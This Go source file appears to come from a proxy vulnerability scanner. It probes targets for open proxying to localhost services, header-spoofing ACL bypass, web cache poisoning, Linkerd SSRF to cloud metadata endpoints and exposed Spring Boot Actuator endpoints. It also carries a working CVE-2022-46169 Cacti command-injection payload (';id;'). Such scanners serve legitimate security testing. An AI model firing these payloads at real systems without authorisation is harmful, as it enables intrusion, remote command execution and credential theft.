package proxy

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// GenericVulnResult contains results from generic proxy misconfiguration checks
type GenericVulnResult struct {
	OpenProxyToLocalhost   bool     `json:"open_proxy_to_localhost"`
	OpenProxyPorts         []string `json:"open_proxy_ports,omitempty"`
	XForwardedForBypass    bool     `json:"x_forwarded_for_bypass"`
	XForwardedForPaths     []string `json:"x_forwarded_for_paths,omitempty"`
	CachePoisonVulnerable  bool     `json:"cache_poison_vulnerable"`
	CachePoisonHeaders     []string `json:"cache_poison_headers,omitempty"`
	LinkerdSSRF            bool     `json:"linkerd_ssrf"`
	LinkerdEndpoints       []string `json:"linkerd_endpoints,omitempty"`
	CVE_2022_46169_Cacti   bool     `json:"cve_2022_46169_cacti"`
	SpringBootActuator     bool     `json:"spring_boot_actuator"`
	ActuatorEndpoints      []string `json:"actuator_endpoints,omitempty"`
}

// testOpenProxyToLocalhost tests if proxy allows connections to localhost/internal ports
func (c *Checker) testOpenProxyToLocalhost(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[OPEN PROXY] Testing for open proxy to localhost/internal ports\n"
	}

	accessiblePorts := []string{}

	// Test common internal services
	testTargets := []struct {
		host string
		port int
		desc string
	}{
		{"127.0.0.1", 22, "SSH"},
		{"127.0.0.1", 23, "Telnet"},
		{"127.0.0.1", 25, "SMTP"},
		{"127.0.0.1", 53, "DNS"},
		{"127.0.0.1", 80, "HTTP"},
		{"127.0.0.1", 110, "POP3"},
		{"127.0.0.1", 143, "IMAP"},
		{"127.0.0.1", 443, "HTTPS"},
		{"127.0.0.1", 445, "SMB"},
		{"127.0.0.1", 3306, "MySQL"},
		{"127.0.0.1", 3389, "RDP"},
		{"127.0.0.1", 5432, "PostgreSQL"},
		{"127.0.0.1", 5900, "VNC"},
		{"127.0.0.1", 6379, "Redis"},
		{"127.0.0.1", 8080, "HTTP-Alt"},
		{"127.0.0.1", 8443, "HTTPS-Alt"},
		{"127.0.0.1", 9200, "Elasticsearch"},
		{"127.0.0.1", 27017, "MongoDB"},
		{"localhost", 22, "SSH via localhost"},
		{"localhost", 3306, "MySQL via localhost"},
		{"[::1]", 22, "SSH via IPv6"},
		{"0.0.0.0", 80, "HTTP via 0.0.0.0"},
	}

	for _, target := range testTargets {
		targetURL := fmt.Sprintf("http://%s:%d/", target.host, target.port)
		req, err := http.NewRequest("GET", targetURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		// Short timeout for internal network requests
		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		// Check for indicators of successful connection
		if resp.StatusCode != 502 && resp.StatusCode != 503 && resp.StatusCode != 504 {
			bodyStr := strings.ToLower(string(body))

			// Look for service-specific indicators
			if target.port == 22 && strings.Contains(bodyStr, "ssh") {
				accessiblePorts = append(accessiblePorts, fmt.Sprintf("%s:%d (%s - SSH banner detected)", target.host, target.port, target.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] SSH accessible at %s:%d\n", target.host, target.port)
				}
			} else if target.port == 3306 && (strings.Contains(bodyStr, "mysql") || strings.Contains(bodyStr, "mariadb")) {
				accessiblePorts = append(accessiblePorts, fmt.Sprintf("%s:%d (%s - MySQL banner)", target.host, target.port, target.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] MySQL accessible at %s:%d\n", target.host, target.port)
				}
			} else if target.port == 5432 && strings.Contains(bodyStr, "postgresql") {
				accessiblePorts = append(accessiblePorts, fmt.Sprintf("%s:%d (%s - PostgreSQL banner)", target.host, target.port, target.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] PostgreSQL accessible at %s:%d\n", target.host, target.port)
				}
			} else if target.port == 6379 && (strings.Contains(bodyStr, "redis") || strings.Contains(bodyStr, "-err")) {
				accessiblePorts = append(accessiblePorts, fmt.Sprintf("%s:%d (%s - Redis banner)", target.host, target.port, target.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] Redis accessible at %s:%d\n", target.host, target.port)
				}
			} else if target.port == 9200 && strings.Contains(bodyStr, "elasticsearch") {
				accessiblePorts = append(accessiblePorts, fmt.Sprintf("%s:%d (%s - Elasticsearch detected)", target.host, target.port, target.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] Elasticsearch accessible at %s:%d\n", target.host, target.port)
				}
			} else if target.port == 27017 && strings.Contains(bodyStr, "mongodb") {
				accessiblePorts = append(accessiblePorts, fmt.Sprintf("%s:%d (%s - MongoDB detected)", target.host, target.port, target.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] MongoDB accessible at %s:%d\n", target.host, target.port)
				}
			} else if resp.StatusCode < 400 {
				// Generic successful response
				accessiblePorts = append(accessiblePorts, fmt.Sprintf("%s:%d (%s - HTTP %d)", target.host, target.port, target.desc, resp.StatusCode))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [HIGH] Port accessible at %s:%d (HTTP %d)\n", target.host, target.port, resp.StatusCode)
				}
			}
		}
	}

	return len(accessiblePorts) > 0, accessiblePorts
}

// testXForwardedForBypass tests for X-Forwarded-For header bypass of ACL restrictions
func (c *Checker) testXForwardedForBypass(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[X-FORWARDED-FOR] Testing for ACL bypass via X-Forwarded-For header\n"
	}

	bypassedPaths := []string{}

	// Test paths that are commonly protected by IP-based ACLs
	protectedPaths := []string{
		"/admin",
		"/admin.php",
		"/administrator",
		"/wp-admin",
		"/phpmyadmin",
		"/console",
		"/api/admin",
		"/admin/config",
		"/admin/login",
		"/.env",
		"/config.php",
		"/server-status",
		"/nginx_status",
		"/.git/config",
		"/debug",
		"/actuator",
		"/actuator/env",
		"/actuator/health",
		"/metrics",
	}

	// Test with various trusted IP addresses that ACLs might whitelist
	trustedIPs := []string{
		"127.0.0.1",
		"localhost",
		"10.0.0.1",
		"192.168.1.1",
		"172.16.0.1",
	}

	for _, path := range protectedPaths {
		// First, try without X-Forwarded-For to establish baseline
		baselineReq, err := http.NewRequest("GET", c.config.ValidationURL+path, nil)
		if err != nil {
			continue
		}
		baselineReq.Header.Set("User-Agent", c.config.UserAgent)

		baselineResp, err := client.Do(baselineReq)
		if err != nil {
			continue
		}
		baselineStatus := baselineResp.StatusCode
		baselineResp.Body.Close()

		// If baseline is 200, path isn't protected anyway
		if baselineStatus == 200 {
			continue
		}

		// Now try with X-Forwarded-For headers
		for _, ip := range trustedIPs {
			req, err := http.NewRequest("GET", c.config.ValidationURL+path, nil)
			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", c.config.UserAgent)
			req.Header.Set("X-Forwarded-For", ip)
			req.Header.Set("X-Real-IP", ip)
			req.Header.Set("X-Client-IP", ip)
			req.Header.Set("X-Originating-IP", ip)
			req.Header.Set("CF-Connecting-IP", ip)
			req.Header.Set("True-Client-IP", ip)
			req.Header.Set("X-Remote-IP", ip)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			// Check if bypass was successful
			if resp.StatusCode == 200 && baselineStatus >= 400 {
				bypassedPaths = append(bypassedPaths, fmt.Sprintf("%s (via X-Forwarded-For: %s)", path, ip))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] ACL bypass at %s using X-Forwarded-For: %s\n", path, ip)
				}
				break // Found bypass for this path, move to next
			}

			// Check for partial indicators even if not 200
			if resp.StatusCode < 400 && resp.StatusCode != baselineStatus {
				bodyStr := strings.ToLower(string(body))
				if !strings.Contains(bodyStr, "forbidden") && !strings.Contains(bodyStr, "access denied") {
					bypassedPaths = append(bypassedPaths, fmt.Sprintf("%s (partial bypass via X-Forwarded-For: %s, HTTP %d)", path, ip, resp.StatusCode))
					if c.debug {
						result.DebugInfo += fmt.Sprintf("  [HIGH] Partial ACL bypass at %s using X-Forwarded-For: %s (HTTP %d)\n", path, ip, resp.StatusCode)
					}
					break
				}
			}
		}
	}

	// Test CVE-2022-46169 (Cacti X-Forwarded-For RCE)
	if c.testCVE_2022_46169(client, result, trustedIPs) {
		bypassedPaths = append(bypassedPaths, "/cacti (CVE-2022-46169 RCE via X-Forwarded-For)")
	}

	return len(bypassedPaths) > 0, bypassedPaths
}

// testCVE_2022_46169 tests for CVE-2022-46169 Cacti RCE via X-Forwarded-For bypass
func (c *Checker) testCVE_2022_46169(client *http.Client, result *ProxyResult, trustedIPs []string) bool {
	if c.debug {
		result.DebugInfo += "[CVE-2022-46169] Testing for Cacti RCE via X-Forwarded-For\n"
	}

	// Cacti remote_agent.php RCE paths
	cactiPaths := []string{
		"/cacti/remote_agent.php",
		"/remote_agent.php",
		"/cacti/include/vendor/phpmailer/phpmailer/get_code.php",
	}

	for _, path := range cactiPaths {
		for _, ip := range trustedIPs {
			// CVE-2022-46169: Bypass authentication and execute commands
			payload := fmt.Sprintf("action=polldata&local_data_ids[0]=6&host_id=1&poller_id=;id;")

			req, err := http.NewRequest("GET", c.config.ValidationURL+path+"?"+payload, nil)
			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", c.config.UserAgent)
			req.Header.Set("X-Forwarded-For", ip)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			bodyStr := strings.ToLower(string(body))

			// Check for command execution indicators
			if resp.StatusCode == 200 && (strings.Contains(bodyStr, "uid=") || strings.Contains(bodyStr, "gid=")) {
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] CVE-2022-46169 RCE detected at %s with X-Forwarded-For: %s\n", path, ip)
				}
				return true
			}

			// Check for Cacti-specific indicators
			if resp.StatusCode == 200 && (strings.Contains(bodyStr, "cacti") || strings.Contains(bodyStr, "poller")) {
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [HIGH] Cacti endpoint accessible at %s with X-Forwarded-For: %s\n", path, ip)
				}
				return true
			}
		}
	}

	return false
}

// testCachePoisoning tests for web cache poisoning via unkeyed headers
func (c *Checker) testCachePoisoning(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[CACHE POISONING] Testing for cache poisoning via unkeyed headers\n"
	}

	poisonedHeaders := []string{}

	// Generate a unique cache-buster for this test
	cacheBuster := fmt.Sprintf("proxyhawk-%d", time.Now().UnixNano())

	// Test unkeyed headers that might influence response but not cache key
	unkeyedHeaders := []struct {
		name  string
		value string
		check string // What to look for in response to confirm poisoning
	}{
		{"X-Forwarded-Host", fmt.Sprintf("evil.%s.com", cacheBuster), "evil"},
		{"X-Forwarded-Scheme", "http", "http"},
		{"X-Forwarded-Proto", "http", "http"},
		{"X-Original-URL", "/evil", "/evil"},
		{"X-Rewrite-URL", "/admin", "/admin"},
		{"X-Host", fmt.Sprintf("evil.%s.com", cacheBuster), "evil"},
		{"X-Forwarded-Server", fmt.Sprintf("evil.%s.com", cacheBuster), "evil"},
	}

	for _, header := range unkeyedHeaders {
		// First request: poison the cache
		req1, err := http.NewRequest("GET", c.config.ValidationURL+"/?cb="+cacheBuster, nil)
		if err != nil {
			continue
		}

		req1.Header.Set("User-Agent", c.config.UserAgent)
		req1.Header.Set(header.name, header.value)

		resp1, err := client.Do(req1)
		if err != nil {
			continue
		}

		body1, _ := io.ReadAll(resp1.Body)
		resp1.Body.Close()

		// Check if header influenced response
		bodyStr1 := string(body1)
		if !strings.Contains(bodyStr1, header.check) {
			continue // Header not reflected, skip
		}

		// Check for cache indicators
		cacheStatus := resp1.Header.Get("X-Cache")
		cacheControl := resp1.Header.Get("Cache-Control")
		age := resp1.Header.Get("Age")

		if c.debug {
			result.DebugInfo += fmt.Sprintf("  [TEST] %s reflected in response. Cache-Control: %s, X-Cache: %s, Age: %s\n",
				header.name, cacheControl, cacheStatus, age)
		}

		// Second request: check if poison persists (from cache)
		time.Sleep(500 * time.Millisecond)

		req2, err := http.NewRequest("GET", c.config.ValidationURL+"/?cb="+cacheBuster, nil)
		if err != nil {
			continue
		}
		req2.Header.Set("User-Agent", c.config.UserAgent)
		// Don't send the poisoning header this time

		resp2, err := client.Do(req2)
		if err != nil {
			continue
		}

		body2, _ := io.ReadAll(resp2.Body)
		resp2.Body.Close()

		bodyStr2 := string(body2)

		// If poisoned value still appears without the header, cache is poisoned
		if strings.Contains(bodyStr2, header.check) {
			poisonedHeaders = append(poisonedHeaders, fmt.Sprintf("%s (unkeyed, cacheable)", header.name))
			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [CRITICAL] Cache poisoning via %s header (unkeyed input)\n", header.name)
			}
		}

		// Check cache headers
		cacheStatus2 := resp2.Header.Get("X-Cache")
		if cacheStatus2 == "HIT" || strings.Contains(strings.ToLower(cacheStatus2), "hit") {
			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [INFO] Response served from cache (X-Cache: %s)\n", cacheStatus2)
			}
		}
	}

	return len(poisonedHeaders) > 0, poisonedHeaders
}

// testLinkerdSSRF tests for Linkerd SSRF via l5d-dtab header
func (c *Checker) testLinkerdSSRF(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[LINKERD SSRF] Testing for Linkerd SSRF via l5d-dtab header\n"
	}

	exposedEndpoints := []string{}

	// Linkerd uses the l5d-dtab header for dynamic routing
	// Format: /svc/* => /$/inet/host/port
	ssrfTargets := []struct {
		dtab string
		desc string
	}{
		{"/svc/* => /$/inet/127.0.0.1/22", "SSH via localhost"},
		{"/svc/* => /$/inet/127.0.0.1/3306", "MySQL via localhost"},
		{"/svc/* => /$/inet/127.0.0.1/6379", "Redis via localhost"},
		{"/svc/* => /$/inet/169.254.169.254/80", "AWS metadata"},
		{"/svc/* => /$/inet/metadata.google.internal/80", "GCP metadata"},
		{"/svc/* => /$/inet/localhost/8080", "Localhost HTTP-Alt"},
	}

	for _, target := range ssrfTargets {
		req, err := http.NewRequest("GET", c.config.ValidationURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)
		req.Header.Set("l5d-dtab", target.dtab)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		// Check for successful SSRF indicators
		if resp.StatusCode == 200 {
			bodyStr := strings.ToLower(string(body))

			// Look for service-specific indicators
			if strings.Contains(target.desc, "SSH") && strings.Contains(bodyStr, "ssh") {
				exposedEndpoints = append(exposedEndpoints, target.desc+" (SSH banner detected)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] Linkerd SSRF to %s\n", target.desc)
				}
			} else if strings.Contains(target.desc, "MySQL") && (strings.Contains(bodyStr, "mysql") || strings.Contains(bodyStr, "mariadb")) {
				exposedEndpoints = append(exposedEndpoints, target.desc+" (MySQL banner)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] Linkerd SSRF to %s\n", target.desc)
				}
			} else if strings.Contains(target.desc, "metadata") && (strings.Contains(bodyStr, "ami-id") || strings.Contains(bodyStr, "instance-id") || strings.Contains(bodyStr, "project-id")) {
				exposedEndpoints = append(exposedEndpoints, target.desc+" (metadata accessible)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] Linkerd SSRF to %s\n", target.desc)
				}
			} else if resp.StatusCode < 400 {
				exposedEndpoints = append(exposedEndpoints, fmt.Sprintf("%s (HTTP %d)", target.desc, resp.StatusCode))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [HIGH] Linkerd SSRF to %s (HTTP %d)\n", target.desc, resp.StatusCode)
				}
			}
		}
	}

	return len(exposedEndpoints) > 0, exposedEndpoints
}

// testSpringBootActuator tests for exposed Spring Boot Actuator endpoints
func (c *Checker) testSpringBootActuator(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[SPRING BOOT ACTUATOR] Testing for exposed Spring Boot Actuator endpoints\n"
	}

	exposedEndpoints := []string{}

	// Spring Boot Actuator endpoints
	actuatorPaths := []struct {
		path string
		desc string
	}{
		{"/actuator", "Actuator root"},
		{"/actuator/env", "Environment variables"},
		{"/actuator/health", "Health check"},
		{"/actuator/info", "Application info"},
		{"/actuator/metrics", "Metrics"},
		{"/actuator/trace", "Request trace"},
		{"/actuator/dump", "Thread dump"},
		{"/actuator/heapdump", "Heap dump"},
		{"/actuator/jolokia", "Jolokia JMX"},
		{"/actuator/logfile", "Log file"},
		{"/actuator/mappings", "Request mappings"},
		{"/actuator/configprops", "Configuration properties"},
		{"/actuator/beans", "Spring beans"},
		{"/actuator/shutdown", "Shutdown endpoint"},
		{"/actuator/gateway/routes", "Gateway routes"},
		{"/actuator/gateway/globalfilters", "Gateway filters"},
	}

	for _, endpoint := range actuatorPaths {
		req, err := http.NewRequest("GET", c.config.ValidationURL+endpoint.path, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)
		req.Header.Set("Accept", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 200 {
			var jsonData map[string]interface{}
			if err := json.Unmarshal(body, &jsonData); err == nil {
				// Valid JSON response indicates exposed actuator endpoint
				exposedEndpoints = append(exposedEndpoints, fmt.Sprintf("%s (%s)", endpoint.path, endpoint.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [HIGH] Exposed Spring Boot Actuator: %s\n", endpoint.path)
				}

				// Check for sensitive data in specific endpoints
				if endpoint.path == "/actuator/env" {
					if _, hasProps := jsonData["propertySources"]; hasProps {
						if c.debug {
							result.DebugInfo += "  [CRITICAL] Environment variables exposed (may contain credentials)\n"
						}
					}
				}

				if endpoint.path == "/actuator/configprops" {
					if c.debug {
						result.DebugInfo += "  [CRITICAL] Configuration properties exposed (may contain secrets)\n"
					}
				}
			}
		}
	}

	return len(exposedEndpoints) > 0, exposedEndpoints
}

// performGenericVulnerabilityChecks runs all generic proxy misconfiguration checks
func (c *Checker) performGenericVulnerabilityChecks(client *http.Client, result *ProxyResult) *GenericVulnResult {
	genericResult := &GenericVulnResult{}

	// Test open proxy to localhost
	genericResult.OpenProxyToLocalhost, genericResult.OpenProxyPorts = c.testOpenProxyToLocalhost(client, result)

	// Test X-Forwarded-For ACL bypass
	genericResult.XForwardedForBypass, genericResult.XForwardedForPaths = c.testXForwardedForBypass(client, result)

	// Test cache poisoning
	genericResult.CachePoisonVulnerable, genericResult.CachePoisonHeaders = c.testCachePoisoning(client, result)

	// Test Linkerd SSRF
	genericResult.LinkerdSSRF, genericResult.LinkerdEndpoints = c.testLinkerdSSRF(client, result)

	// Test Spring Boot Actuator
	genericResult.SpringBootActuator, genericResult.ActuatorEndpoints = c.testSpringBootActuator(client, result)

	// CVE-2022-46169 is tested within testXForwardedForBypass
	genericResult.CVE_2022_46169_Cacti = false
	for _, path := range genericResult.XForwardedForPaths {
		if strings.Contains(path, "CVE-2022-46169") {
			genericResult.CVE_2022_46169_Cacti = true
			break
		}
	}

	return genericResult
}
